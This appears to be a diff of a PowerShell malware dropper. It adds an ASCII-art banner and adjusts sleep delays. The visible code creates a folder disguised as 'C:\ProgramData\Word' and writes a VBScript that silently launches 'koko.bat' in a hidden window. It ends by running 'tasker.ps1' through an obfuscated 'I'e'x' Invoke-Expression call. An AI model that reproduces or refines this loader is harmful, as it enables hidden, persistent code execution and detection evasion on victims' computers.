@@ -1,9 +1,17 @@
 
+# ██████╗ ███████╗██████╗ ██████╗  ██████╗ 
+# ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔═══██╗
+# ██████╔╝█████╗  ██║  ██║██████╔╝██║   ██║
+# ██╔══██╗██╔══╝  ██║  ██║██╔══██╗██║   ██║
+# ██║  ██║███████╗██████╔╝██║  ██║╚██████╔╝
+# ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
+
+
 $d =  "C:\ProgramData\Word" 
 
 New-Item -ItemType Directory -Path $d -Force | Out-Null
 
-sleep 1
+sleep -Seconds 2
 
 $content = @'
 
@@ -17,7 +25,7 @@ try
 
 $content = @'
 on error resume next
-WScript.Sleep 10000
+WScript.Sleep 5000
 
 set A = CreateObject("WScript.Shell")
 A.run "C:\ProgramData\Word\koko.bat",0
@@ -95,5 +103,5 @@ catch {
     
 }
 
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 3
 I'e'x([IO.File]::ReadAllText("$d\tasker.ps1"))
